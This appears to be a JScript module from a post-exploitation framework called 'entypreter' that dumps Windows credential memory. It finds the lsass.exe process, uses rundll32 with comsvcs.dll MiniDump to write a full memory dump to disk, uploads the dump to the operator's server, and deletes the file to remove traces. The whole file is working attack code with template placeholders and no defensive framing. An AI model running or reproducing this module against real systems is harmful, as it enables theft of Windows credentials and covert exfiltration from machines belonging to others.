try
{
    var headers = {};

    var res_file = "~DIRECTORY~\\"+entypreter.uuid()+".bin";

    var lpid = "";

    if (~LSASSPID~ == 0)
    {
        lpid = entypreter.process.getPID("lsass.exe");
        if (lpid)
        {
            entypreter.work.report(lpid.toString(),{'Task': 'pid'});
        }
        else
        {
            entypreter.work.report('',{'Task': 'nopid'});
            var e = Error('Could not identify process ID');
            throw e;
        }
    }
    else
    {
        lpid = ~LSASSPID~;
    }

    var cmd = "C:\\Windows\\System32\\rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump "+ lpid.toString()+ " " + res_file + " full";
    
    entypreter.work.report('',{'Task': 'startrun'});
    var newpid = entypreter.WMI.createProcess(cmd, true);

    /* 
       we only get a process ID returned, so we have to search through running processes
       until we can't find the process anymore. then we'll be able to upload.
    */
    var pidflag = true;
    while (pidflag)
    {
        pidflag = false;
        var processes = entypreter.process.list();
        var items = new Enumerator(processes);
        while (!items.atEnd())
        {
            var proc = items.item();

            try
            {
                if (proc.ProcessId == newpid)
                {
                    pidflag = true;
                    break;
                }
            } catch (e)
            {
            }
            items.moveNext();
        }
    }
    entypreter.work.report('',{'Task': 'endrun'});

    entypreter.work.report('',{'Task': 'upload'});
    entypreter.http.upload(res_file, 'dump', ~CERTUTIL~, 'Task');

    entypreter.work.report('',{'Task': 'delbin'});
    entypreter.file.deleteFile(res_file);

}
catch (e)
{
    entypreter.work.error(e);
}

entypreter.exit();
